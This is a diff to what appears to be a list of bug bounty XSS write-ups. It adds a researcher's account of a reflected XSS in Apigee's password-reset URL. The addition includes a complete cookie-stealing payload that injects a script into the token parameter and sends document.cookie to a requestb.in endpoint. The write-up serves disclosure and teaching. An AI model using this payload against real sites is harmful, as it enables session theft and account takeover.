@@ -92,6 +92,35 @@ So that’s how I went from a P5 Race Condition to a P5 Self XSS to a P2 Blind X
     3/ When you find a P5 bug you may use it and chain it with another bug to increase the severity (tip 2), they are not always useless
 
 - [Google Acquisition XSS (Apigee)](https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4)
+
+  I enter apigee.com which provides API management, so as always I start my burp suite and I try to verify all the functions as possible,
+  
+  On the first try, everything was secure and all my first test failed, but as a bug hunter it should not be 100% secure and nothing is safe, So I log out and start to check the   login and register option, look all right here
+  
+  at some point, I tried to check the password reset action, get a link in my email account that looks like this
+  
+  ![xssapigee1](https://miro.medium.com/max/875/1*6XtCH-i6JORylw3RssPuMA.png)
+  >
+  > https://api.accounts.apigee.com/management/users/[REDACTED]/resetpw?token=ZW0tsHaU-REDACTED-eeTDi2YRIN1CICmFjOSSE2JvllO_-REDACTED-
+  >
+  Here, I have the idea to try to bypass the token and obtain a valid link for all users, which allows me to update any user password, but this failed too and can’t bypass it
+  
+  when I was trying to edit the link and change the token code, I saw something normal for me, it looks like this entry has not been filtered here, so I tried to send some XSS     payload as a test.
+  
+  ![xssapigee2](https://miro.medium.com/max/875/1*ZnE07D9YoVUQ6TO8pUgJBA.png)
+  
+  ![xssapigee3](https://miro.medium.com/max/875/1*Mh0BMWvAeWAGfP1ksvVJhw.png)
+  
+  let's steal some cookies 😍
+  
+  as it's not legal to hack someone account, I tested in my own account
+  
+  1. create first the payload :
+  >
+  > https://api.accounts.apigee.com/management/users/xxxxxx/resetpw?token=xxxxxxx"><script>new Image().src=’https://requestb.in/xxxxxx?code='+document.cookie</script><a href=”
+  >
+  2. ON CLICK & All cookies will be sent to us😅
+
 - [DOM-Based XSS at accounts.google.com by Google Voice Extension](http://www.missoumsai.com/google-accounts-xss.html)
 - [XSS on Microsoft.com via Angular Js template injection](https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8)
 - [Researching Polymorphic Images for XSS on Google Scholar](https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html)
